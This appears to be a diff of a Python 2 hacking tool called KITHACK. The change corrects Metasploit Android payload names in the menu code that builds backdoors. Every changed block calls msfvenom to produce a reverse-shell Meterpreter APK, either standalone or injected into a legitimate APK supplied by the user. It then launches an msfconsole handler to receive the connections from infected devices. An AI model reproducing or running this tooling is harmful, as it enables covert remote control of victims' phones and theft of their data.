@@ -1423,9 +1423,9 @@ def options():
 
 		elif sys == 3:
 			print '{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN)
-			print '{0}[01]{1} android/meterpreter_reverse_http'.format(WHITE, YELLOW)
-			print '{0}[02]{1} android/meterpreter_reverse_https'.format(WHITE, YELLOW)
-			print '{0}[03]{1} android/meterpreter_reverse_tcp'.format(WHITE, YELLOW)
+			print '{0}[01]{1} android/meterpreter/reverse_http'.format(WHITE, YELLOW)
+			print '{0}[02]{1} android/meterpreter/reverse_https'.format(WHITE, YELLOW)
+			print '{0}[03]{1} android/meterpreter/reverse_tcp'.format(WHITE, YELLOW)
 			print '{0}[04]{1} android/shell/reverse_http'.format(WHITE, YELLOW)
 			print '{0}[05]{1} android/shell/reverse_https'.format(WHITE, YELLOW)
 			print '{0}[06]{1} android/shell/reverse_tcp'.format(WHITE, YELLOW)
@@ -1445,7 +1445,7 @@ def options():
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/meterpreter/reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
 					location = os.getcwd()
 					print("\033[1;32m")
 					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
@@ -1454,7 +1454,7 @@ def options():
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_http; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
@@ -1475,7 +1475,7 @@ def options():
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
 					location = os.getcwd()
 					print("\033[1;32m")
 					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
@@ -1484,7 +1484,7 @@ def options():
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))					
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_http; exploit\'"'.format(LHOST, LPORT))					
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
@@ -1515,7 +1515,7 @@ def options():
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/meterpreter/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
 					location = os.getcwd()
 					print("\033[1;32m")
 					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
@@ -1524,7 +1524,7 @@ def options():
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_https; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
@@ -1545,7 +1545,7 @@ def options():
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
 					location = os.getcwd()
 					print("\033[1;32m")
 					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
@@ -1554,7 +1554,7 @@ def options():
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))					
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_https; exploit\'"'.format(LHOST, LPORT))					
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
@@ -1585,7 +1585,7 @@ def options():
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, OUT))																				
 					location = os.getcwd()
 					print("\033[1;32m")
 					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:
@@ -1594,7 +1594,7 @@ def options():
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
@@ -1615,7 +1615,7 @@ def options():
 					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 					time.sleep(4)
-					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter_reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
+					os.system('service postgresql start && msfvenom -x {0} -p android/meterpreter/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, OUT))																				
 					location = os.getcwd()
 					print("\033[1;32m")
 					if os.stat('output/{}.apk'.format(OUT)).st_size != 0:	
@@ -1624,7 +1624,7 @@ def options():
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
 						else:
-							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))					
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))					
 							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
 							os.system('service postgresql stop && clear')
 							banner(), menu(), options()	
